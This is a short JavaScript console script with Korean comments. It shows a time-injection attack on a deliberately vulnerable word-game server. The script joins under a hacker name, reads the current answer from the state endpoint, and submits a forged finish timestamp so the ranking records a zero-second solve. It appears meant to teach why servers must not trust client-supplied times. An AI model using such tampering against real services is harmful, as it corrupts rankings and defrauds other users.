// 현재시간: console.log(new Date().toLocaleString('ko-KR'));
//
// 2. "해커1"으로 0초 만에 푼 것처럼 기록하는 공격 (시간 인젝션)
// 전제: 취약 서버(server_weak.js) 처럼
// /api/finish에서 clientFinishedAt를 그대로 믿고 랭킹을 정렬하는 경우.
// 라운드 시작 시각을 fakeTime으로 넣어서
// 0초 만에 푼 것처럼 /api/finish 를 보내는 공격 코드
(async () => {
    try {
        // 1) "해커1" 이름으로 참가 (항상 새 playerId 발급)
        const joinRes = await fetch("api/join", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ name: "해커1" })
        });
        const joinData = await joinRes.json();
        const playerId = joinData.playerId;
        console.log("join 완료, playerId:", playerId, "이름:", joinData.name);

        // 2) 현재 라운드 상태 조회
        const stateRes = await fetch("api/state");
        const state = await stateRes.json();

        const fakeTime = state.roundStart;  // 라운드 시작 시각 = 0초만에 푼 것처럼
        const answer  = state.word;         // 현재 라운드 정답
        const tries   = 1;                  // 한 번만에 맞췄다고 주장

        console.log("라운드 시작(fakeTime):", new Date(fakeTime).toLocaleString());
        console.log("현재(now):", new Date(state.now).toLocaleString());
        console.log("실제 경과 시간:", Math.floor((state.now - state.roundStart) / 1000), "초");

        // 3) 조작된 시간과 정답으로 finish 전송
        const finishRes = await fetch("api/finish", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                playerId,
                tries,
                clientFinishedAt: fakeTime, // ⚠ 취약 지점: 서버가 이 값을 믿는 경우
                answer
            })
        });

        const finishData = await finishRes.json();
        console.log("finish 서버 응답:", finishData);
    } catch (e) {
        console.error("공격 중 오류:", e);
    }
})();
